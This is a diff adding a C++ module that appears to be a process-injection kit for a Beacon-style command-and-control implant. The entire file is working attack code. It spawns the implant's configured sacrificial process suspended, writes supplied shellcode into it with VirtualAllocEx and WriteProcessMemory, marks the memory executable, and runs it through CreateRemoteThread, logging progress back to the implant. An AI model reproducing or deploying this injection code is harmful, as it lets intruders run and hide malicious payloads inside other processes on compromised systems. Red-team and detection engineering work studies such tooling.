@@ -1,0 +1,77 @@
+#include <general.h>
+
+// this define is mandatory
+#define PS_INJECT_KIT
+
+auto SpawnInjection(     
+    _In_  PBYTE ShellcodeBuff,
+    _In_  ULONG ShellcodeSize,
+    _In_  PBYTE InjectArg
+) -> NTSTATUS {
+    NTSTATUS            status       = STATUS_SUCCESS; 
+    PROCESS_INFORMATION process_info = { 0 };
+
+    PS_CREATE_ARGS* create_args = (PS_CREATE_ARGS*)malloc( sizeof(PS_CREATE_ARGS) );
+    BEACON_INFO*    info        = (BEACON_INFO*)malloc( sizeof(BEACON_INFO) );
+
+    BeaconInformation( info );
+
+    if ( ! BeaconHeapCheckPtr( info->Config->Postex.Spawnto ) ) {
+        PVOID spawnto = BeaconHeapAlloc( wcslen( info->Config->Postex.Spawnto ) * sizeof(WCHAR) + sizeof(WCHAR) );
+        memcpy( spawnto, info->Config->Postex.Spawnto, wcslen( info->Config->Postex.Spawnto ) * sizeof(WCHAR) + sizeof(WCHAR) );
+        info->Config->Postex.Spawnto = (WCHAR*)spawnto;
+    }
+
+    create_args->pipe      = FALSE;
+    create_args->method    = Create::Default;
+    create_args->argument  = info->Config->Postex.Spawnto;
+    create_args->state     = CREATE_SUSPENDED;
+
+    auto cleanup = [&]( ERROR_CODE code ) {
+        if ( create_args ) free( create_args );
+        if ( info        ) free( info        );
+
+        return code;
+    };
+
+    status = kh_process_creation( create_args, &process_info );
+    if ( ! nt_success( status ) ) {
+        BeaconPrintfW( CALLBACK_ERROR, L"Process creation failure with error: (%d) %s", status, fmt_error( status ) );
+        return cleanup( GetLastError() );
+    }
+
+    HANDLE   process_handle  = nullptr;
+    LONG     error_code      = ERROR_SUCCESS;
+
+    process_handle = process_info.hProcess;
+
+    BeaconPrintfW( CALLBACK_INFO, L"Spawned process with pid %d and tid %d", process_info.dwProcessId, process_info.dwThreadId );
+
+    PVOID shellcode_ptr = VirtualAllocEx( process_handle, nullptr, ShellcodeSize, MEM_COMMIT, PAGE_READWRITE );
+    if ( ! shellcode_ptr ) {
+        BeaconPrintfW( CALLBACK_ERROR, L"Allocation memory to shellcode failed with error: (%d) %s", GetLastError(), fmt_error( GetLastError() ) );
+        return cleanup( GetLastError() );
+    }
+
+    SIZE_T bytes_written = 0;
+    if ( ! WriteProcessMemory( process_handle, shellcode_ptr, ShellcodeBuff, ShellcodeSize, &bytes_written ) ) {
+        BeaconPrintfW( CALLBACK_ERROR, L"Write shellcode failed with error: (%d) %s", GetLastError(), fmt_error( GetLastError() ) );
+        return cleanup( GetLastError() );
+    }
+
+    ULONG old_protection = 0;
+    if ( ! VirtualProtectEx( process_handle, shellcode_ptr, ShellcodeSize, PAGE_EXECUTE_READ, &old_protection ) ) {
+        BeaconPrintfW( CALLBACK_ERROR, L"Change protection to RX failed with error: (%d) %s", GetLastError(), fmt_error( GetLastError() ) );
+        return cleanup( GetLastError() );
+    }
+
+    ULONG  thread_id     = 0;
+    HANDLE thread_handle = nullptr;
+    
+    thread_handle = CreateRemoteThread( process_handle, nullptr, 0, (LPTHREAD_START_ROUTINE)shellcode_ptr, nullptr, 0, &thread_id );
+
+    process_info.dwThreadId = thread_id;
+    process_info.hThread    = thread_handle;
+
+    return cleanup( ERROR_SUCCESS );
+}
